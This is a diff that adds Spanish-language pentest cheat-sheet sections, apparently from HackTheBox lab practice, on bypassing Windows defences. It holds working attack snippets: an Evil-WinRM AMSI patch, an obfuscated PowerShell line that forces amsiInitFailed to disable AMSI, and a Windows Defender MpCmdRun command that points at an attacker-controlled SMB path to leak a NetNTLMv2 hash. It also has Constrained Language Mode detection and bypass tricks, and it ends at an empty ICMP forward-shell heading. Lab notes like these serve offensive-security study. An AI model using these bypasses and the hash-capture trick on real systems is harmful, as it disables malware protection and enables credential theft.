@@ -1,5 +1,55 @@
 # Bypassing
 
+## AMSI
+
+### Automatización de WinRM
+
+```null
+*Evil-WinRM* PS C:\Users\melanie\Desktop> Bypass-4MSI
+
+Info: Patching 4MSI, please be patient...
+
+[+] Success!
+```
+
+### Corromper tarea (Condición de carrera)
+
+```null
+$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
+$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
+$field.SetValue($null,$true)
+```
+
+## Obtención de hash NetNTLMv2 con Windows Defender
+
+```null
+*Evil-WinRM* PS C:\Program Files\Windows Defender> ./MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.16.6\test
+```
+
+## CLM
+
+### Detección
+
+```null
+[10.10.10.210]: PS> $ExecutionContext.SessionState.LanguageMode                                                       
+ConstrainedLanguage
+```
+
+### PSSessions
+
+```null
+PS /home/rubbx/Desktop/HTB/Machines/Reel2> Enter-PSSession -ComputerName 10.10.10.210 -Credential $Cred -Authentication Negotiate
+```
+
+### Ejecución de comandos con funciones
+
+```null
+[10.10.10.210]: PS> function bypassCLM { whoami }
+[10.10.10.210]: PS>bypassCLM
+htb\k.svensson
+```
+
 ## ICMP Forward Shell
 
 ```python
